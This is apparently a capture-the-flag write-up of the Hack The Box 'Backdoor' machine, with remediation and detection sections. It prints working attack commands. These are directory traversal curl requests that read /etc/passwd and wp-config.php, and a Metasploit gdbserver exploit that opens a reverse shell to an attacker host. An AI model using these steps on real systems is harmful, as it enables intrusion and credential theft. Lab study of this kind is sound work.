# Backdoor — HTB Easy, Linux

**By d4rkgunn3r / Dylan Senez — Authorized laboratory assessment**

**Attack path:** WordPress enumeration → eBook Download directory traversal → sensitive file disclosure → exposed gdbserver/1337 → remote code execution as low-privilege user → detached root `screen` session → root

> **Colour key:** **ATTACKER** blocks run on your host. **TARGET** blocks run inside the HTB machine once you have a shell.

### Reproducibility gaps in the retained source material

- The exact final `screen` attach command was not preserved in the fetched notes. The evidence records the root-owned session path and successful root access, so this write-up does not invent the missing command.
- Database credentials and flag values are removed from the public copy.

---

## 02 — Scope

| Field | Detail |
| --- | --- |
| Machine | Backdoor / HTB, Easy, Linux |
| Target IP (recorded run) | `10.129.96.68` |
| Starting access | Unauthenticated |
| Confirmed services | SSH/22, Apache + WordPress/80, gdbserver/1337 |
| Objective | Obtain user and root proof in the authorized HTB lab |

## 03 — External recon

**ATTACKER**

```bash
nmap -sV -sC -p- 10.129.96.68 -T4 --min-rate 5000 -oA Backdoor
```

The web service exposed WordPress 5.8.1, while TCP/1337 required additional service identification.

## 04 — WordPress plugin traversal

The installed **eBook Download 1.1** plugin exposed a file-download handler vulnerable to directory traversal.

```bash
curl -s 'http://10.129.96.68/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../etc/passwd'
curl -s 'http://10.129.96.68/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php'
```

The response disclosed application/database configuration. Credentials are redacted.

## 05 — gdbserver remote code execution

TCP/1337 was confirmed as an exposed gdbserver.

**ATTACKER**

```text
msfconsole
use exploit/multi/gdb/gdb_server_exec
set RHOSTS 10.129.96.68
set RPORT 1337
set TARGET 1
set payload linux/x64/shell_reverse_tcp
set LHOST <ATTACKER_IP>
run
```

The exploit opened an interactive command shell.

**TARGET**

```bash
whoami
hostname
id
```

## 06 — User proof

```bash
cat /home/user/user.txt
```

Flag content is omitted.

## 07 — Privilege escalation

Post-exploitation enumeration found a detached **root-owned GNU Screen session** under:

```text
/run/screen/S-root/
└── 1007.root
```

The retained evidence states that attaching to this root session yielded a root shell. Because the exact attach syntax was not preserved, it is intentionally not reconstructed here.

Proof after attaching:

```bash
whoami
id
cat /root/root.txt
```

## 08 — Vulnerability summary & remediation

| # | Finding | Asset | Rating |
| --- | --- | --- | --- |
| 1 | Directory traversal in eBook Download 1.1 permits arbitrary file read | WordPress plugin | High |
| 2 | Unauthenticated gdbserver permits remote code execution | TCP/1337 | Critical |
| 3 | Accessible root-owned detached screen session enables privilege escalation | Local host | Critical |

### Remediations

- Remove the vulnerable plugin or upgrade to a fixed, maintained version.
- Rotate credentials exposed through `wp-config.php`.
- Never expose gdbserver to untrusted networks.
- Remove unattended root `screen` sessions and review startup/cron logic that creates them.
- Restrict `/run/screen` permissions and alert on root terminal multiplexer sessions.

## 09 — Detection opportunities

- Traversal sequences against WordPress plugin download handlers.
- Inbound gdb remote-protocol connections to unexpected ports.
- Debugger-launched shells or child processes.
- Creation or long-lived presence of root-owned `screen` sessions.
- Non-root users attaching to root terminal-multiplexer sockets.

## 10 — Timeline

1. Nmap identified SSH, WordPress, and TCP/1337.
2. Plugin enumeration identified eBook Download 1.1.
3. Directory traversal retrieved sensitive files.
4. TCP/1337 was validated as gdbserver and exploited.
5. User-level shell and proof obtained.
6. A detached root-owned `screen` session was discovered.
7. The root session was attached and root proof collected.

**Publication note:** database credentials, session secrets, and flag values have been removed from this shared copy.
